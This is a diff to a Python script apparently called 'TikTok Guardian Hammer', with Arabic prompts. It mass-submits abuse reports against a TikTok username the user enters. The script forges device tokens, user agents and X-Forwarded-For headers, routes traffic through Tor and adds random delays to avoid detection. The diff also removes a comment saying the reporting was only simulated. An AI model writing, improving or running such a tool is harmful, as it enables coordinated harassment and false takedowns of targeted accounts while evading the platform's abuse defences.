@@ -3,6 +3,7 @@
 """
 TikTok Guardian Hammer v3.0 - الإصدار المحسن
 """
+
 import requests
 import random
 import time
@@ -13,7 +14,7 @@ import hashlib
 import socket
 from threading import Lock
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from fake_useragent import UserAgent # type: ignore
+from fake_useragent import UserAgent  # type: ignore
 from typing import List, Dict, Optional
 
 CONFIG = {
@@ -32,6 +33,7 @@ CONFIG = {
     "proxy_refresh_interval": 300
 }
 
+
 class AttackVectorPool:
     def __init__(self, pool_size=100):
         self.pool = [self._create_session() for _ in range(pool_size)]
@@ -48,20 +50,20 @@ class AttackVectorPool:
         with self.lock:
             return random.choice(self.pool)
 
-def _generate_headers(self):
-    device_id = f"LX{random.randint(int(1E15), int(9E15)):016d}"
-    return {
-        'User-Agent': UserAgent().random,
-        'X-Tt-Token': self._generate_fake_token(),
-        'X-SS-Stub': hashlib.md5(device_id.encode()).hexdigest(),
-        'X-Client-Lang': random.choice(['ar-SA', 'en-US']),
-        'X-Forwarded-For': '.'.join(str(random.randint(1, 255)) for _ in range(4))
-    }
-
+    def _generate_headers(self):
+        device_id = f"LX{random.randint(int(1E15), int(9E15)):016d}"
+        return {
+            'User-Agent': UserAgent().random,
+            'X-Tt-Token': self._generate_fake_token(),
+            'X-SS-Stub': hashlib.md5(device_id.encode()).hexdigest(),
+            'X-Client-Lang': random.choice(['ar-SA', 'en-US']),
+            'X-Forwarded-For': '.'.join(str(random.randint(1, 255)) for _ in range(4))
+        }
 
     def _generate_fake_token(self):
         chars = "abcdef0123456789"
         return ''.join(random.choice(chars) for _ in range(32))
+
 
 class CyberLynxPro:
     def __init__(self):
@@ -84,13 +86,13 @@ class CyberLynxPro:
     def send_report(self, target):
         session = self.session_pool.get_session()
         if not self.test_proxy(session):
+            print("[!] Proxy check failed. Skipping...")
             return
 
         reason = random.choice(self.report_reasons)
         jitter = random.uniform(*CONFIG["jitter_range"])
         time.sleep(jitter)
 
-        # Simulate a report request (This should be replaced by actual logic)
         try:
             response = session.post(
                 f"https://www.tiktok.com/report?user={target}&reason={reason}",
@@ -122,14 +124,24 @@ class CyberLynxPro:
             iteration += 1
             time.sleep(5)
 
+
+def is_tor_running():
+    try:
+        with socket.create_connection(("127.0.0.1", 9050), timeout=2):
+            return True
+    except:
+        return False
+
+
 if __name__ == "__main__":
     TARGET = input(" :ﻑﺪﻬﺘﺴﻤﻟﺍ ﺏﺎﺴﺤﻟﺍ ﻢﺳﺍ ﻞﺧﺩﺃ")
 
     if sys.platform != 'linux':
         sys.exit("[ERROR] Android/Termux environment required")
 
-    os.system("tor &")
-    time.sleep(2)
+    if not is_tor_running():
+        os.system("tor &")
+        time.sleep(5)
 
     nexus = CyberLynxPro()
     try:
